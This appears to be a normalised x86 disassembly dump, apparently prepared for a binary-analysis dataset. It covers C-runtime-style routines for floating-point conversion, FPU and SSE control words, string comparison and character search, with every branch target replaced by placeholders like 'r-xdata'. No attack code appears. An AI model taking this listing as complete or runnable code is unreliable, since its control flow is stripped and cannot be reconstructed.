mov [ ebp - 0x48 ] edi
cwde
add edi eax
mov [ ebp - 0x48 ] edi
test edi edi
jg r-xdata
xor eax eax
cmp [ ebp - 0x54 ] ax
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x74 ]
cmp ax [ ebp - 0x68 ]
jae r-xdata
mov esi [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x40 ] esi
cmp eax edx
jne r-xdata
cmp eax 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_42eb0a
add esp 0xc
test eax eax
jne r-xdata
mov edi [ ebp - 0x18 ]
shr edi 0x10
sub edi 0x3ffe
xor eax eax
push 0x8
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x16 ] ax
mov ebx [ ebp - 0x18 ]
pop edi
mov [ ebp - 0x48 ] eax
push 0x15
pop eax
cmp edi eax
jle r-xdata
xor eax eax
mov [ ecx ] ax
mov eax 0x8000
cmp [ ebp - 0x78 ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ecx + 0x2 ] al
xor eax eax
inc eax
mov [ ecx + 0x3 ] al
mov [ ecx + 0x4 ] 0x30
cmp di [ ebp - 0x6c ]
ja r-xdata
mov ecx [ ebp - 0x44 ]
test ecx ecx
jne r-xdata
imul ecx ecx 0xc
add ecx eax
mov eax 0x8000
mov [ ebp - 0x88 ] ecx
cmp [ ecx ] ax
jb r-xdata
push r--data
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_42a241
int3
mov [ ebx + 0x3 ] 0x6
mov ecx edx
mov eax esi
shr eax 0x1f
shr ecx 0x1f
add edx edx
add ebx ebx
add esi esi
or ebx ecx
or edx eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x18 ] ebx
dec edi
jne r-xdata
mov edi [ ebp - 0x68 ]
push 0x0
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x40 ] esi
pop ebx
test edi edi
jns r-xdata
cmp di [ ebp - 0x58 ]
ja r-xdata
sar [ ebp - 0x44 ] 0x3
add eax 0x54
mov [ ebp - 0x54 ] eax
and ecx 0x7
je r-xdata
jmp r-xdata
movzx edi [ ecx + 0xa ]
mov eax [ ebp - 0x16 ]
mov [ ebp - 0x64 ] edi
xor [ ebp - 0x64 ] eax
and eax 0x7fff
and edi 0x7fff
mov [ ebp - 0x50 ] eax
add eax edi
mov esi 0x8000
and [ ebp - 0x64 ] esi
mov [ ebp - 0x60 ] edi
movzx edi ax
mov eax [ ebp - 0x50 ]
dec esi
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4c ] edi
cmp ax si
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ecx [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x88 ] ecx
push r--data
push r--data
jmp r-xdata
mov esi [ ebp - 0x70 ]
mov eax [ ebp - 0x48 ]
lea edi [ esi + 0x4 ]
inc eax
mov ecx edi
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x58 ] eax
test eax eax
jle r-xdata
neg edi
and edi 0xff
jle r-xdata
test cx cx
jne r-xdata
mov [ ebp - 0x18 ] ebx
jmp r-xdata
mov eax [ ebp - 0x18 ]
shr eax 0x10
mov ecx 0x3fff
cmp ax cx
jb r-xdata
xor eax eax
cmp [ ebp - 0x64 ] ax
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x60 ] si
mov esi [ ebp - 0x40 ]
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_42eb0a
add esp 0xc
test eax eax
jne r-xdata
mov al [ ecx - 0x1 ]
sub ecx 0x2
cmp al 0x35
jl r-xdata
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ ebp - 0x40 ]
mov ecx edx
mov eax edi
shr eax 0x1f
add edx edx
or edx eax
mov eax [ ebp - 0x44 ]
shr ecx 0x1f
lea esi [ eax + eax ]
or esi ecx
add edi edi
mov eax edi
mov ecx edx
shr eax 0x1f
add edx edx
shr ecx 0x1f
or edx eax
mov eax [ ebp - 0x3c ]
add edi edi
add esi esi
or esi ecx
lea ecx [ eax + edi ]
mov [ ebp - 0x48 ] ecx
cmp ecx edi
jb r-xdata
mov ebx [ ebp - 0x44 ]
test ax ax
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
mov esi ebx
mov edx ebx
cmp di [ ebp - 0x6c ]
ja r-xdata
xor eax eax
jmp r-xdata
cmp ecx edi
jae r-xdata
jmp r-xdata
lea eax [ edx + 0x1 ]
mov ecx ebx
cmp eax edx
jb r-xdata
cmp ecx eax
jae r-xdata
mov ecx edx
mov eax ebx
shl eax 0x1f
shl ecx 0x1f
shr edx 0x1
shr esi 0x1
shr ebx 0x1
or esi ecx
or edx eax
dec edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] esi
test edi edi
jg r-xdata
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x40 ] esi
xor ebx ebx
mov edx ebx
push 0x5
mov [ ebp - 0x50 ] edx
lea ecx [ ebp - 0xc ]
pop eax
inc edi
test [ ebp - 0x28 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
test edx edx
jne r-xdata
cmp di [ ebp - 0x58 ]
ja r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp ecx edi
jae r-xdata
cmp ecx edi
jae r-xdata
xor ecx ecx
inc ecx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edi [ eax + edx ]
cmp edi edx
jb r-xdata
add ecx 0x2
inc edx
dec eax
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x5c ] eax
test eax eax
jg r-xdata
lea edi [ ebp - 0x20 ]
lea eax [ ebp - 0x28 ]
lea edi [ edi + edx * 2 ]
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x58 ] edi
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
test esi esi
jne r-xdata
test ax ax
jne r-xdata
mov [ ebp - 0x18 ] ebx
jmp r-xdata
dec ecx
mov eax [ ebp - 0x70 ]
sub cl al
sub cl 0x3
mov [ eax + 0x3 ] cl
movsx ecx cl
mov [ ecx + eax + 0x4 ] bl
xor eax eax
inc eax
mov ecx [ ebp - 0x70 ]
xor eax eax
mov [ ecx ] ax
mov eax 0x8000
cmp [ ebp - 0x78 ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ecx + 0x2 ] al
xor eax eax
inc eax
mov [ ecx + 0x3 ] al
mov [ edi ] 0x30
jmp r-xdata
cmp [ ecx ] 0x39
jne r-xdata
cmp ecx edi
jae r-xdata
inc esi
test ecx ecx
mov ecx [ ebp - 0x48 ]
mov edx eax
je r-xdata
inc esi
cmp edi eax
jae r-xdata
mov esi eax
test eax eax
jle r-xdata
mov edi [ ebp - 0x4c ]
mov esi [ ebp - 0x8 ]
add edi 0xc002
test di di
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp edi edx
jae r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
mov esi ebx
mov edx ebx
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] edx
mov [ ecx + 0x5 ] bl
jmp r-xdata
mov [ ecx ] 0x30
dec ecx
inc [ ecx ]
inc ecx
inc [ esi ]
mov esi [ ebp - 0x70 ]
mov edi [ ebp - 0x68 ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov edx [ ebp - 0x48 ]
add esi [ ebp - 0x34 ]
add edx edx
mov eax ecx
shr eax 0x1f
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x20 ] edx
lea edx [ edi + edi ]
or edx eax
mov ecx edi
shr ecx 0x1f
lea eax [ esi + esi ]
or eax ecx
mov ecx [ ebp - 0x5c ]
mov [ ebp - 0x18 ] eax
shr eax 0x18
add al 0x30
mov [ ecx ] al
mov eax [ ebp - 0x58 ]
inc ecx
dec eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x15 ] bl
mov [ ebp - 0x58 ] eax
test eax eax
jle r-xdata
mov edx [ ebp - 0x10 ]
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x44 ] ebx
mov [ ecx - 0x4 ] edi
test eax eax
je r-xdata
mov eax [ ebp - 0x68 ]
push 0x5
mov eax ebx
pop esi
mov [ ebp - 0x80 ] eax
lea edx [ ebp - 0xc ]
mov [ ebp - 0x50 ] esi
inc edi
test [ ecx + 0x8 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
test edx edx
jne r-xdata
mov cx [ ebp - 0x10 ]
mov eax edi
neg eax
movzx eax ax
add edi eax
mov [ ebp - 0x4c ] edi
mov edi [ ebp - 0x7c ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x44 ] ebx
mov edx [ ebp - 0x44 ]
push 0x0
pop ebx
test di di
jle r-xdata
mov eax [ ebp - 0xc ]
mov ecx eax
mov edx ebx
add eax eax
shr edx 0x1f
or eax edx
mov [ ebp - 0xc ] eax
shr ecx 0x1f
add esi esi
mov eax 0xffff
add ebx ebx
or esi ecx
add edi eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] esi
test di di
jg r-xdata
mov edi [ ebp - 0x58 ]
mov eax [ ebp - 0x6c ]
add edi 0x2
sub eax 0x2
dec esi
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x6c ] eax
test esi esi
jg r-xdata
inc [ ecx ]
add edx 0x2
inc eax
dec esi
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x50 ] esi
test esi esi
jg r-xdata
lea esi [ ebp - 0x20 ]
lea eax [ esi + eax * 2 ]
lea esi [ ecx + 0x8 ]
mov ecx [ ebp - 0x60 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x84 ] esi
cmp [ ecx + 0x4 ] ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0xe ]
cmp eax 0xffffffff
jne r-xdata
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov ebx [ ebp - 0xc ]
mov ecx ebx
mov eax esi
shl eax 0x1f
shl ecx 0x1f
shr ebx 0x1
shr edx 0x1
or ebx eax
or edx ecx
shr esi 0x1
dec [ ebp - 0x5c ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] edx
jne r-xdata
inc edi
mov eax 0xffff
add edi eax
test di di
jns r-xdata
test esi esi
js r-xdata
movzx edx [ eax ]
movzx eax [ edi ]
imul edx eax
mov eax [ ecx - 0x4 ]
mov [ ebp - 0x68 ] ebx
lea edi [ eax + edx ]
cmp edi eax
jb r-xdata
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x60 ] esi
test esi esi
jle r-xdata
mov edi [ ebp - 0x4c ]
mov eax [ ebp - 0x8 ]
mov esi [ ebp - 0x10 ]
add edi 0xc002
mov [ ebp - 0x40 ] eax
test di di
jle r-xdata
xor esi esi
inc esi
jmp r-xdata
cmp eax edi
jae r-xdata
cmp [ ecx ] ebx
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc eax
mov [ ebp - 0xe ] eax
mov eax [ ebp - 0xa ]
mov [ ebp - 0xe ] ebx
cmp eax 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
push 0x0
test edi edi
mov edi [ ebp - 0x4c ]
mov [ ebp - 0x8 ] esi
pop ebx
je r-xdata
mov eax 0xffff
add edi eax
test di di
jns r-xdata
test eax eax
js r-xdata
mov [ edx - 0x4 ] eax
test esi esi
je r-xdata
mov esi [ ebp - 0x7c ]
mov eax [ ebp - 0x54 ]
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x54 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov [ ebp - 0x1a ] esi
mov edx [ ebp - 0x1c ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x16 ] di
jmp r-xdata
inc eax
mov [ ebp - 0xa ] eax
mov ax [ ebp - 0x6 ]
mov ecx 0xffff
mov [ ebp - 0xa ] ebx
cmp ax cx
jne r-xdata
xor eax eax
mov cx dx
inc eax
or cx ax
mov [ ebp - 0x10 ] cx
mov edx [ ebp - 0x10 ]
jmp r-xdata
mov ax [ ebp - 0x10 ]
mov ebx [ ebp - 0x40 ]
mov eax edi
neg eax
movzx eax ax
add edi eax
xor edx edx
mov [ ebp - 0x4c ] edi
mov edi [ ebp - 0x74 ]
mov [ ebp - 0x50 ] eax
inc edx
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx eax
add eax eax
mov edx esi
shr edx 0x1f
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
shr ecx 0x1f
add eax eax
or eax ecx
mov ecx 0xffff
add esi esi
add edi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x40 ]
mov esi [ ebp - 0x84 ]
add eax 0x2
sub esi 0x2
dec ecx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x84 ] esi
test ecx ecx
jg r-xdata
inc [ edx ]
inc ax
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov eax 0x8000
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
mov eax 0x8000
cmp cx ax
ja r-xdata
mov eax [ ebp - 0xe ]
cmp eax 0xffffffff
jne r-xdata
and esi 0x1ffff
cmp esi 0x18000
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax ebx
shl eax 0x1f
mov [ ebp - 0x40 ] ecx
shr [ ebp - 0x40 ] 0x1
or [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
shl ecx 0x1f
shr esi 0x1
shr ebx 0x1
or esi ecx
dec [ ebp - 0x50 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] esi
jne r-xdata
inc edi
movzx edi [ eax ]
movzx eax [ esi ]
imul edi eax
mov eax [ edx - 0x4 ]
mov [ ebp - 0x7c ] ebx
lea esi [ eax + edi ]
cmp esi eax
mov [ ebp - 0x60 ] esi
mov eax esi
jb r-xdata
mov ecx [ ebp - 0x88 ]
mov esi [ ebp - 0x50 ]
mov eax [ ebp - 0x80 ]
mov esi [ ebp - 0x8 ]
jmp r-xdata
inc eax
mov [ ebp - 0xe ] eax
mov eax [ ebp - 0xa ]
mov [ ebp - 0xe ] ebx
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x40 ]
test [ ebp - 0x10 ] dl
je r-xdata
push 0x0
mov [ ebp - 0x40 ] ebx
test edi edi
mov edi [ ebp - 0x4c ]
pop ebx
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x64 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1a ] ecx
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x16 ] di
jmp r-xdata
inc eax
mov [ ebp - 0xa ] eax
mov ax [ ebp - 0x6 ]
mov edx 0xffff
mov [ ebp - 0xa ] ebx
cmp ax dx
jne r-xdata
mov ax si
or ax dx
mov [ ebp - 0x10 ] ax
mov esi [ ebp - 0x10 ]
jmp r-xdata
mov [ ebp - 0x40 ] esi
mov eax 0x7fff
cmp di ax
jae r-xdata
inc ax
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov [ ebp - 0x6 ] cx
inc edi
jmp r-xdata
mov ecx 0x8000
cmp ax cx
ja r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
sub_43a7ac
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
push ebx
push esi
push edi
mov edi 0x200
test cl 0x8
je r-xdata
mov eax 0x80
test cl 0x4
je r-xdata
or eax edi
test cl 0x2
je r-xdata
or eax 0x400
test cl 0x1
je r-xdata
or eax 0x800
mov esi 0x100
test ecx 0x80000
je r-xdata
or eax 0x1000
mov edx ecx
mov ebx 0x300
and edx ebx
je r-xdata
or eax esi
mov edx 0x3000000
pop edi
and ecx edx
pop esi
pop ebx
cmp ecx 0x1000000
je r-xdata
cmp edx esi
je r-xdata
or eax 0x8040
cmp ecx 0x2000000
je r-xdata
or eax 0x2000
cmp edx edi
je r-xdata
or eax 0x40
pop ebp
retn
cmp ecx edx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp edx ebx
jne r-xdata
pop ebp
retn
or eax 0x8000
pop ebp
retn
or eax 0x6000
jmp r-xdata
sub_43a855
push ebp
mov ebp esp
sub esp 0xc
fwait
fnstcw [ ebp - 0x4 ]
mov ax [ ebp - 0x4 ]
xor ecx ecx
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or ecx 0x1
push ebx
push esi
movzx esi ax
mov edx esi
mov ebx 0xc00
push edi
mov edi 0x200
and edx ebx
je r-xdata
or ecx 0x80000
and esi 0x300
je r-xdata
cmp edx 0x400
je r-xdata
or ecx 0x20000
cmp esi edi
jne r-xdata
or ecx 0x100
cmp edx 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov esi edi
not esi
and esi ecx
and eax edi
or esi eax
cmp esi ecx
je r-xdata
or ecx 0x40000
movzx eax ax
mov edx 0x1000
test edx eax
je r-xdata
or ecx 0x10000
jmp r-xdata
or ecx edi
jmp r-xdata
cmp edx ebx
jne r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
push esi
call sub_43ab55
movzx eax ax
pop ecx
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
xor esi esi
test al 0x1
je r-xdata
or ecx 0x300
jmp r-xdata
mov eax esi
and edi 0x308031f
stmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
xor ecx ecx
test al al
jns r-xdata
test al 0x4
je r-xdata
push 0x10
pop esi
test eax 0x200
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or esi 0x8
test eax 0x400
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or esi 0x4
test eax 0x800
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or esi 0x2
test edx eax
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or esi 0x1
test eax 0x100
je r-xdata
or ecx 0x1
movzx edx ax
mov ecx edx
and ecx ebx
je r-xdata
or esi 0x80000
mov edx eax
mov ebx 0x6000
and edx ebx
je r-xdata
or ecx 0x80000
and edx 0x300
je r-xdata
cmp ecx 0x400
je r-xdata
push 0x40
and eax 0x8040
pop ebx
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or esi 0x20000
cmp edx 0x200
jne r-xdata
or esi 0x100
cmp ecx 0x800
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or esi 0x40000
mov edx 0x1000
test edx eax
je r-xdata
or esi 0x10000
jmp r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov eax ecx
xor eax esi
or ecx esi
test eax 0x8031f
je r-xdata
push eax
call sub_43a7ac
push eax
mov [ ebp + 0xc ] eax
call sub_431f8a
pop ecx
pop ecx
stmxcsr [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
xor ecx ecx
test al al
jns r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx ebx
jne r-xdata
or esi 0x300
jmp r-xdata
mov eax ecx
jmp r-xdata
or ecx 0x80000000
test eax 0x200
je r-xdata
push 0x10
pop ecx
mov eax edi
and edi [ ebp + 0x8 ]
not eax
and eax ecx
or eax edi
cmp eax ecx
je r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x400
je r-xdata
or ecx 0x8
test eax 0x800
je r-xdata
or ecx 0x4
test eax 0x1000
je r-xdata
or ecx 0x2
test eax 0x100
je r-xdata
or ecx 0x1
mov edx eax
mov edi 0x6000
and edx edi
je r-xdata
or ecx 0x80000
and eax 0x8040
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx edi
jne r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
sub_43ab55
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
test cl 0x8
je r-xdata
inc eax
test cl 0x4
je r-xdata
or eax 0x4
test cl 0x2
je r-xdata
or eax 0x8
test cl 0x1
je r-xdata
or eax 0x10
test ecx 0x80000
je r-xdata
or eax 0x20
push esi
mov edx ecx
mov esi 0x300
push edi
mov edi 0x200
and edx esi
je r-xdata
or eax 0x2
mov edx ecx
and edx 0x30000
je r-xdata
cmp edx 0x100
je r-xdata
or eax esi
cmp edx 0x10000
jne r-xdata
or eax 0x400
cmp edx edi
je r-xdata
pop ebp
retn
or eax 0x1000
pop edi
pop esi
test ecx 0x40000
je r-xdata
or eax edi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp edx esi
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_43abf0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_43ac51
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
push esi
mov eax 0x404e
push edi
mov [ ebp - 0x4 ] eax
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
cmp [ ebp + 0xc ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
mov ecx edx
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] edx
mov edx [ ebx + 0x8 ]
test edx 0x8000
jne r-xdata
mov edx [ ebx + 0x4 ]
xor ecx ecx
inc ecx
cmp eax [ ebp - 0x1c ]
jae r-xdata
pop edi
pop esi
mov [ ebx + 0xa ] ax
pop ebx
leave
retn
mov edi [ ebx ]
mov esi [ ebx + 0x4 ]
mov ecx [ ebx ]
mov esi edx
mov eax ecx
shr eax 0x10
shl edx 0x10
or edx eax
mov eax [ ebp - 0x4 ]
shr esi 0x10
shl ecx 0x10
add eax 0xfff0
mov [ ebx ] ecx
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] esi
mov edx [ ebp - 0x18 ]
xor eax eax
lea ecx [ esi + edx ]
mov [ ebp - 0xc ] ecx
cmp ecx esi
jb r-xdata
mov eax esi
xor ecx ecx
lea esi [ eax + 0x1 ]
cmp esi eax
jb r-xdata
mov [ ebx ] eax
test ecx ecx
je r-xdata
mov eax edi
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
mov eax [ ebp - 0x4 ]
shr ecx 0x1f
add edx edx
or edx ecx
add eax 0xffff
add edi edi
mov [ ebp - 0x4 ] eax
test edx 0x8000
je r-xdata
mov [ ebx ] edi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] edx
xor eax eax
inc eax
cmp ecx edx
jae r-xdata
xor ecx ecx
inc ecx
cmp esi 0x1
jae r-xdata
mov edx [ ebp + 0x10 ]
add edi [ ebp - 0x14 ]
mov esi [ ebp - 0xc ]
and [ ebp - 0x10 ] 0x0
mov eax edx
shr eax 0x1f
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
mov ecx [ ebp + 0x8 ]
add edx edx
mov [ ebx ] edx
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] eax
movsx edi [ ecx ]
mov [ ebp - 0x8 ] esi
lea ecx [ edx + edi ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x1c ] edi
mov [ ebp + 0x10 ] ecx
cmp ecx edx
jb r-xdata
inc edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] ecx
test eax eax
je r-xdata
inc edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] esi
test ecx ecx
je r-xdata
xor edx edx
inc edx
jmp r-xdata
cmp ecx edi
jae r-xdata
mov [ ebx ] ecx
test edx edx
je r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
dec eax
inc [ ebp + 0x8 ]
mov [ ebx + 0x4 ] esi
mov [ ebp + 0xc ] eax
test eax eax
jne r-xdata
lea ecx [ esi + 0x1 ]
xor edx edx
cmp ecx esi
jb r-xdata
mov edx [ ebp + 0x10 ]
mov esi ebx
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov eax ecx
shr eax 0x1f
mov ecx esi
shr ecx 0x1f
add esi esi
or esi eax
add edi edi
or edi ecx
add edx edx
mov eax edx
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
mov eax [ ebp - 0x1c ]
shr ecx 0x1f
add edx edx
add edi edi
or edi ecx
add eax edx
xor ecx ecx
mov [ ebx ] edx
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] edi
mov [ ebp + 0x10 ] eax
cmp eax edx
jb r-xdata
mov eax 0x404e
xor edx edx
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebx + 0x8 ] eax
mov esi ecx
mov [ ebx + 0x4 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] esi
test edx edx
je r-xdata
sub_43ae40
cmp [ rw-data ] 0x1
jb r-xdata
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
movzx eax [ esp + 0x8 ]
mov edx eax
shl eax 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov edx [ esp + 0x4 ]
mov ecx 0xf
or eax 0xffffffff
and ecx edx
shl eax cl
sub edx ecx
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
bsf eax ecx
add eax edx
movd edx xmm3
xor ecx ecx
cmp dl [ eax ]
cmovne eax ecx
retn
or eax 0xffffffff
add edx 0x10
jmp r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
movdqu xmm1 [ edx ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
por xmm2 xmm1
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
